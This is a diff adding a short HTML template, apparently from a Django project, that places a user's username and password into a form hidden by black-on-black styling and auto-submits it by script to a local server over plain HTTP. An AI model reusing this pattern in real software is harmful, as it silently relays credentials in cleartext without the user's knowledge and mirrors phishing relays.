@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>response</title>
+    <style>
+        *{
+            background-color: black;
+            color:black;
+        }
+    </style>
+</head>
+<body>
+    <form action="http://127.0.0.1:9000" method="post" id="fm" style="background-color:black;color:black;">
+        {% csrf_token %}
+        <input type="text" value={{uname}} name="uname" id="uname" />
+        <input type="text" id="logpwd" name="logpwd" value={{pwd}} />
+        <input type="submit" value="submit" />
+    </form>
+    <script>
+        var f=document.getElementById("fm");
+        f.submit();
+    </script>
+</body>
+</html>
